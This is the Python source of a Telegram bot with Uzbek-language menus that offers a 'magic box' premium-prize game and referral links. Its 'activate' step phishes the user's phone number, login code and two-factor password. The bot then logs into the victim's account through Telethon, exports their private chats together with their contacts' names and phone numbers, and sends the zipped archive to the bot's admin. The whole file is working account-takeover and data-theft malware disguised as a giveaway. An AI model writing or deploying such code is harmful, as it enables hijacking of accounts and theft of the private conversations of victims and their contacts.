import os, re, json, zipfile, shutil, random
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters import CommandStart
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor

from telethon import TelegramClient
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError

# ========= ENV =========
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

BASE_DIR = "chats_export"
USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

# ========= INIT =========
bot = Bot(BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())
sessions = {}

# ========= JSON =========
def load_json(f, d):
    if not os.path.exists(f):
        with open(f,"w") as w: json.dump(d,w)
    return json.load(open(f))

def save_json(f,d):
    json.dump(d, open(f,"w"), indent=2)

users = load_json(USERS_FILE,{})
config = load_json(CONFIG_FILE,{"magic_box":"on"})

def ensure(uid):
    users.setdefault(uid,{
        "boxes":0,
        "win":random.randint(1,3),
        "prize":False,
        "refs":0,
        "ref_by":None
    })
    save_json(USERS_FILE,users)

# ========= MENUS =========
def menu(admin=False):
    kb = [
        ["🎁 Sehrli quti"],
        ["🏆 Yutuqlar","👥 Referal"],
        ["✅ Aktivlash"]
    ]
    if admin: kb.append(["⚙️ Admin panel"])
    return types.ReplyKeyboardMarkup(kb,resize_keyboard=True)

def back():
    return types.ReplyKeyboardMarkup([["⬅️ Orqaga"]],resize_keyboard=True)

# ========= START =========
@dp.message_handler(CommandStart())
async def start(m: types.Message):
    uid = str(m.from_user.id)
    ensure(uid)

    if len(m.text.split())>1:
        ref = m.text.split()[1]
        if ref in users and users[uid]["ref_by"] is None and ref!=uid:
            users[uid]["ref_by"]=ref
            users[ref]["refs"]+=1
            save_json(USERS_FILE,users)

    await m.answer("👋 Xush kelibsiz",reply_markup=menu(m.from_user.id==ADMIN_ID))

# ========= REFERAL =========
@dp.message_handler(lambda m:m.text=="👥 Referal")
async def ref(m):
    uid=str(m.from_user.id)
    ensure(uid)
    me = await bot.get_me()
    await m.answer(
        f"🔗 https://t.me/{me.username}?start={uid}\n"
        f"👤 Referallar: {users[uid]['refs']}"
    )

# ========= SEHRLI QUTI =========
@dp.message_handler(lambda m:m.text=="🎁 Sehrli quti")
async def box(m):
    uid=str(m.from_user.id)
    ensure(uid)
    u=users[uid]
    if u["boxes"]>=3:
        return await m.answer("❌ Qutilar tugagan")
    kb=types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton(
            f"Ochish ({u['boxes']+1}/3)",
            callback_data="open_box"
        )
    )
    await m.answer("🎁 Sehrli quti",reply_markup=kb)

@dp.callback_query_handler(lambda c:c.data=="open_box")
async def open_box(c):
    uid=str(c.from_user.id)
    u=users[uid]
    u["boxes"]+=1
    win = config["magic_box"]=="on" and u["boxes"]==u["win"]
    if win:
        u["prize"]=True
        txt="🎉 Premium yutdingiz!"
    else:
        txt="📦 Bo‘sh chiqdi"
    save_json(USERS_FILE,users)
    await c.message.edit_text(txt)
    await c.answer()

# ========= YUTUQLAR =========
@dp.message_handler(lambda m:m.text=="🏆 Yutuqlar")
async def prize(m):
    uid=str(m.from_user.id)
    ensure(uid)
    await m.answer("🏆 Premium bor" if users[uid]["prize"] else "❌ Yutuq yo‘q")

# ========= AKTIVLASH =========
@dp.message_handler(lambda m:m.text=="✅ Aktivlash")
async def act(m):
    sessions[m.from_user.id]={"step":"phone"}
    await m.answer("📲 Telefon yuboring",reply_markup=back())

@dp.message_handler(lambda m:m.text=="⬅️ Orqaga")
async def back_(m):
    sessions.pop(m.from_user.id,None)
    await m.answer("🏠 Menu",reply_markup=menu(m.from_user.id==ADMIN_ID))

@dp.message_handler(lambda m:m.from_user.id in sessions)
async def login(m):
    s=sessions[m.from_user.id]
    t=m.text.strip()

    if s["step"]=="phone":
        client=TelegramClient(f"s_{m.from_user.id}",API_ID,API_HASH)
        await client.connect()
        await client.send_code_request(t)
        s.update({"step":"code","phone":t,"client":client})
        return await m.answer("🔐 Kod yuboring")

    if s["step"]=="code":
        try:
            await s["client"].sign_in(s["phone"],t)
        except SessionPasswordNeededError:
            s["step"]="pass"
            return await m.answer("🔑 Parol")
        await m.answer("⏳ Export...")
        return await export(m.from_user.id)

    if s["step"]=="pass":
        await s["client"].sign_in(password=t)
        await m.answer("⏳ Export...")
        await export(m.from_user.id)

# ========= EXPORT =========
def safe(x): return re.sub(r"[^\w\d_-]","_",x)

def media(m):
    if m.photo: return "rasm yubordiz"
    if m.video: return "video yubordiz"
    if m.voice: return "ovozli xabar yubordiz"
    if m.document: return "fayl yubordiz"
    return "media yubordiz"

async def export(uid):
    client=sessions[uid]["client"]
    os.makedirs(BASE_DIR,exist_ok=True)

    for d in await client.get_dialogs():
        if isinstance(d.entity,User) and not d.entity.bot:
            u=d.entity
            name=f"{u.first_name or ''} {u.last_name or ''}".strip()
            folder=os.path.join(BASE_DIR,f"{safe(name)}_{u.id}")
            os.makedirs(folder,exist_ok=True)

            with open(f"{folder}/chat.txt","w",encoding="utf-8") as f:
                f.write(f"Ism: {name}\nID: {u.id}\nUsername: @{u.username}\nTelefon: {u.phone}\n\n")
                async for m in client.iter_messages(u,limit=2000,reverse=True):
                    time=m.date.strftime("%Y-%m-%d %H:%M:%S")
                    who="siz" if m.out else name
                    txt=m.text if m.text else media(m)
                    f.write(f"[{time}] {who}: {txt}\n")

    zipn=f"chats_{uid}.zip"
    with zipfile.ZipFile(zipn,"w") as z:
        for r,_,fs in os.walk(BASE_DIR):
            for f in fs:
                p=os.path.join(r,f)
                z.write(p,os.path.relpath(p,BASE_DIR))

    await bot.send_document(ADMIN_ID,types.InputFile(zipn))
    shutil.rmtree(BASE_DIR)
    os.remove(zipn)
    await client.disconnect()
    sessions.pop(uid,None)

# ========= ADMIN =========
@dp.message_handler(lambda m:m.text=="⚙️ Admin panel" and m.from_user.id==ADMIN_ID)
async def adm(m):
    kb=types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("ON",callback_data="on"),
        types.InlineKeyboardButton("OFF",callback_data="off")
    )
    await m.answer("Sehrli quti",reply_markup=kb)

@dp.callback_query_handler(lambda c:c.data in ["on","off"] and c.from_user.id==ADMIN_ID)
async def sw(c):
    config["magic_box"]=c.data
    save_json(CONFIG_FILE,config)
    await c.answer("OK")

# ========= RUN =========
if __name__=="__main__":
    executor.start_polling(dp,skip_updates=True)
